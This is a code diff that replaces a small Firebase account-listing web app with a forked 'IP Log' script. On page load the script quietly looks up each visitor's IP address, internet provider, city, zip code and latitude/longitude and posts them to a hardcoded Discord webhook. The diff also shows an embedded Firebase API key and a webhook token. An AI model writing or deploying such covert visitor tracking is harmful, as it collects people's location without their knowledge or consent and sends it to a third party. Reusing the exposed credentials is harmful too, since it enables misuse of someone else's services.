@@ -1,85 +1,57 @@
-// Firebase Configuration
-import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js";
-import { getFirestore, collection, addDoc, getDocs, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-firestore.js";
+// Paste your Discord Webhook API URL into Line 3: WEBHOOKURL => YOUR API URL
 
-// Firebase Config Object
-const firebaseConfig = {
-    apiKey: "AIzaSyCKM_LeEJGtW7Qy9ptxAI548GQZg9ZTOZI",
-    authDomain: "rppsss.firebaseapp.com",
-    projectId: "rppsss",
-    storageBucket: "rppsss.firebasestorage.app",
-    messagingSenderId: "879317256494",
-    appId: "1:879317256494:web:8eab04243a662d7942d2bf",
-    measurementId: "G-3CVNF2DY0H"
-};
+var webHookUrl = "https://discord.com/api/webhooks/1367442476239159337/VueoMCQB7tuu47sz_ajL4HuhLQ_8dWRWLn5GpjJFm-I4HiDmvgbMQCCkifiLCm49rRTE";
 
-// Initialize Firebase
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+/*
+    Forked from: https://github.com/luisoos/IP-Log-To-Discord-Webhook
+    License: MIT
+*/
 
-// DOM Elements
-const form = document.getElementById("account-form");
-const accountsList = document.getElementById("accounts-list");
+const request = async () => { // Calling a "synchronous" fetch
+    const response = await fetch('https://ip-api.com/json/');
+    const data = await response.json();
 
-// Load accounts from Firestore
-async function loadAccounts() {
-    const querySnapshot = await getDocs(collection(db, "accounts"));
-    querySnapshot.forEach((doc) => {
-        const account = doc.data();
-        account.id = doc.id; // Store the document ID
-        addAccountToUI(account);
-    });
+    // Declaring variables
+    var ip = data.query;
+
+    var provider = data.org + " (" + data.as + ")";
+
+    var timezone = data.timezone;
+    var country = data.country;
+    var countryCode = data.countryCode.toLowerCase()
+    var region = data.region + " (" + data.regionName + ")";
+    var city = data.city;
+
+    var zip = data.zip;
+    var lat = data.lat;
+    var lon = data.lon;
+
+    // Open POST Request
+    var postRequest = new XMLHttpRequest();
+    postRequest.open("POST", webHookUrl);
+
+    postRequest.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+        username:   "IP Log",
+        avatar_url: "",
+        content:    "__**:globe_with_meridians: IP-Adress:**__ \n" 
+                    + "`" + ip + "`" + 
+                    "\n \n__**:telephone: Provider:**__ \n" 
+                    + provider + 
+                    "\n \n__**:map: Timezone:**__ \n" 
+                    + timezone + 
+                    "\n \n__**:flag_" + countryCode + ": Country and Region:**__ \n" 
+                    + country + " - " + region + 
+                    "\n \n__**:cityscape: Zip Code & City:**__ \n" 
+                    + zip + " " + city +
+                    "\n \n__**:round_pushpin: Location:**__ \n" 
+                    + "**Longitude:** " + lon + "\n"
+                    + "**Latitude:** " + lat
+    }
+
+    postRequest.send(JSON.stringify(params));
+
 }
 
-// Add account to Firestore
-async function saveAccountToFirestore(account) {
-    await addDoc(collection(db, "accounts"), account);
-}
-
-// Delete account from Firestore
-async function deleteAccountFromFirestore(id) {
-    await deleteDoc(doc(db, "accounts", id));
-}
-
-// Add account to the UI
-function addAccountToUI(account) {
-    const accountDiv = document.createElement("div");
-    accountDiv.classList.add("account");
-    accountDiv.innerHTML = `
-        <span><strong>Username:</strong> ${account.username}</span>
-        <span><strong>Power:</strong> ${account.power}</span>
-        <button class="delete-btn">Delete</button>
-    `;
-
-    // Delete button functionality
-    accountDiv.querySelector(".delete-btn").addEventListener("click", async () => {
-        await deleteAccountFromFirestore(account.id);
-        accountDiv.remove();
-    });
-
-    accountsList.appendChild(accountDiv);
-}
-
-// Form submission
-form.addEventListener("submit", async (e) => {
-    e.preventDefault();
-
-    // Get form values
-    const username = document.getElementById("username").value;
-    const power = document.getElementById("power").value;
-
-    // Create account object
-    const account = { username, power };
-
-    // Save to Firestore
-    await saveAccountToFirestore(account);
-
-    // Add to UI
-    addAccountToUI(account);
-
-    // Clear form
-    form.reset();
-});
-
-// Load accounts on page load
-loadAccounts();
+request();
